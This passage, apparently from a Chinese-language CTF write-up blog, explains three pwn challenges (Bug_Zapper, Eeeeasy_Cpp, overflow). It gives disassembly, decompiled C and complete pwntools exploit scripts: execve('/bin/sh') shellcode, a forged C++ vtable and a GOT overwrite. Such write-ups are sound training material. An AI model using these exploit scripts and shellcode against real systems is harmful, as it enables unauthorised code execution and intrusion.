s<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00\x00\x00"</span><span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug_Zapper"></a>Bug_Zapper</h2><p>最终目的是要走到run那 执行mmap中的shellcode，要走到mmap那的话，输入长度最大 0x10，其实是在求 0x55 - 0x65 中哪个系统调用执行完rax是0，那就会走到run那，试了一下输入长度为11个字节，也就是系统调用号为0x50 + 0xb的系统调用执行完rax是0，会走到run那，思路是构造一个长度为11字节的 syscall read to 1919180的payload，跳到1919180那再read 一次，然后写shellcode</p>
<pre class="line-numbers language-none"><code class="language-none">syscall                 ; LINUX - sys_read
cmp     rax, 10h
ja      short end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">add     rax, 55h ; &#39;U&#39;
xor     rdi, rdi        ; pathname
xor     rsi, rsi        ; mode
xor     rdx, rdx
syscall                 ; LINUX - sys_creat
cmp     rax, 0
jnz     short end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">run:
xor     rbx, rbx
xor     rcx, rcx
xor     rdx, rdx
xor     rsi, rsi
xor     rdi, rdi
xor     r8, r8
xor     r9, r9
xor     r10, r10
xor     r11, r11
xor     r12, r12
xor     r13, r13
xor     r14, r14
xor     r15, r15
mov     rax, 1919810h
jmp     rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">35235</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bugzapper'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>



p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># payload = 'a' * (0x10 - 5)</span>


payload <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov rsi,rax
xor eax,eax
xor edi,edi
xor edx,esi
syscall
'''</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># g(p)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string">'nop'</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span>

shellcode <span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov rax,0x68732f6e69622f
push rax
push rsp
pop rdi
xor esi,esi
xor edx,edx
mov eax,0x3b
syscall  
'''</span><span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.7</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>



p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Eeeeasy-Cpp"><a href="#Eeeeasy-Cpp" class="headerlink" title="Eeeeasy_Cpp"></a>Eeeeasy_Cpp</h2><p>好耶，第一次做cpp pwn，在检查输入长度的时候用的函数是strlen，可以用\x00去绕过strlen，然后修改虚表地址劫持控制流，程序开了pie，给了一个main函数的地址，可以在read username的时候通过溢出 修改 Challenge类中 成员对象的地址 为bss(用main函数算出基地址然后加偏移算出bss)的地址，然后虚表的地址为 bss + 0x10，read password的时候写backdoor的地址，这样就伪造了一个虚表，里面是backdoor，然后在call CHallenge::get的时候就会call到backdoor</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">36705</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./EeeeasyCpp'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_account</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"G"</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"Enter your name: "</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">"Enter your password: "</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show_account</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"P"</span><span class="token punctuation">)</span>


p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">"gift: "</span><span class="token punctuation">)</span>
main <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
elf_base <span class="token operator">=</span> main <span class="token operator">-</span> <span class="token number">0x2650</span>
backdoor <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x22E0</span>

success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"main_addr -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"elf_base -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>elf_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"backdoor -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"aaaaaaa\x00"</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x28</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'cccccccc'</span>
<span class="token comment"># g(p)</span>
get_account<span class="token punctuation">(</span>payload<span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span>
show_account<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'cccccccc'</span><span class="token punctuation">)</span>
vtable <span class="token operator">=</span> u64<span class="token punctuation">(</span>rl<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"vtable -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>vtable<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

bss <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x5000</span>
success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"bss -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>bss<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b"aaaaaaa\x00"</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x28</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'cccccccc'</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span>
<span class="token comment"># g(p)</span>
get_account<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span><span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"G"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>在输入的时候传了一个引用，可以覆盖实现一个任意地址值写，写stack_chk_fail的got为backdoor的地址，再覆盖canary触发stack_chk_fail就能劫持控制流了</p>
<pre class="line-numbers language-none"><code class="language-none">std::operator&gt;&gt;&lt;char,std::char_traits&lt;char&gt;&gt;(&amp;std::cin);
std::string::operator&#x3D;(a1, v3);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h]</span>
  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-58h]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-50h]</span>
  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-28h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-8h]</span>

  v8 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">basic_string</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_4012C0</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"You said: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"Bye~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_4012C0</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span> <span class="token string">"What do you want to say?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>operator<span class="token operator">>></span><span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>std<span class="token operator">::</span>cin<span class="token punctuation">)</span><span class="token punctuation">;</span>
  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">0</span>
IP <span class="token operator">=</span> <span class="token string">"yuanshen.life"</span>
PORT <span class="token operator">=</span> <span class="token number">37133</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./overflow'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
